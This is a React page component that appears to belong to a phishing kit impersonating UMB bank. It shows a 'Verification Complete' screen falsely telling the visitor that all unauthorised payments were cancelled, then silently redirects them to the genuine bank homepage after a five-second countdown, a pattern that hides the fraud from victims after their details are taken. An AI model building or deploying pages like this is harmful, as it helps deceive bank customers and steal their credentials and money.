import { useEffect, useState } from "react";
import { FaCheckCircle } from "react-icons/fa";
import PageWatcher from "../components/pagewaters";
import BankHeader from "../components/bankhead";

export default function Verified() {
  const [seconds, setSeconds] = useState(5);

  useEffect(() => {
    const interval = setInterval(() => {
      setSeconds((prev) => {
        if (prev <= 1) {
          clearInterval(interval);

          // Redirect to another website
          window.location.href = "https://www.umb.com/";

          return 0;
        }

        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  return (
    <>
   
      <PageWatcher />
 <BankHeader/>
      <div className=" flex items-center justify-center px-4">
        <div className="w-full bg-[#f5f5f5] p-[100px]  max-w-md bg-[#f2f2f2] p-8 rounded-sm">
          <h2 className="text-[20px] font-medium text-[#222] mb-10">
            Verification Complete
          </h2>

          <div className="flex justify-center">
            <FaCheckCircle className="text-[#00A651] text-[140px]" />
          </div>

          <p className="mt-10 text-center text-[14px] leading-8 text-[#333]">
We have successfully cancelled all unauthorised payment.            <br />
            You'll be redirected to our homepage in  {" "}
            <span className="font-semibold">{seconds}</span> second
            {seconds !== 1 ? "s" : ""}.
          </p>
        </div>
      </div>
    </>
  );
}